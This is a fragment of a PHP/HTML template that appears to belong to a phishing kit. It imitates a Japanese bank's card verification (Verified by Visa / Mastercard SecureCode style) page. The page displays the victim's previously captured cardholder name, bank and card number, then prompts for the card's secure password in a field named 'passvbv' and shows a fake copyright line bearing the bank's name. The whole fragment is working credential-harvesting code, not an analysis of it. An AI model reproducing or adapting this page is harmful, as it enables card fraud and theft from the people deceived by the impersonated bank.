...
<html>
    ...
    <meta charset="utf8">
    <title>検証者 <?php echo $_SESSION['_cctype_']; ?></title>
...
<div style="background: rgba(255,255,255,.96);border-radius: 5px; padding: 1.25rem 0; margin: -7px;width: 90%;height: 70%;position: fixed;
left: 7%;" class="content_check ">
   ...
   elseif ($_SESSION['_cctype_'] == "mastercard"  ){
	...
	<br><table align="center" width="100%" style="font-size: 13px;font-family:pp-sans-small-regular, Helvetica Neue, Arial, sans-serif; color: black;margin-left: 5%;">        <tbody>
        <tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">カード名義人 : </td>
            <td style="font-size: 1.05em;"><?php echo $_SESSION['namecard']; ?></td>
        </tr>
		<tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">銀行名 : </td>
            <td style="font-size: 1.05em;"><?php echo $_SESSION['_namebank_']; ?></td></tr> <tr><td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">カード番号 : </td><td id="<? echo $_SESSION['ps']; ?>" style="font-size: 1.1em;"><?php if ($_SESSION['_cctype_'] == "visa"  ){
   ...
   elseif ($_SESSION['_cctype_'] == "mastercard"  ){
     ...
     <div id="zwimel" class="zwimel" style="display:none;"><img id="loading-image" src="../style/img/loading.gif" /></div>
		...
		<tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">パスワード :</td>
            <td style="font-size: 1.05em;">
			 <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="password" placeholder="パスワード" name="passvbv" id="vbv" required="required" onclick="bani();" onblur="ghebri();" >
            </td>
            </tr>  
       ...
       <tr>
            ...
            <td style="font-size: 1.05em;"><br>
                <input  type="submit" value="送信" style="font-size: 12px;color: #fcfdee;font-weight: bold;font-size: 1.05em;">
    ...
    <p style="text-align:center;font-family: arial, sans-serif;font-size: 9px;color: #656565;margin-top: 17px;padding-bottom: 30px;">
        Copyright © 2020 <?php echo $_SESSION['_namebank_']; ?> - All rights reserved.
    </p>
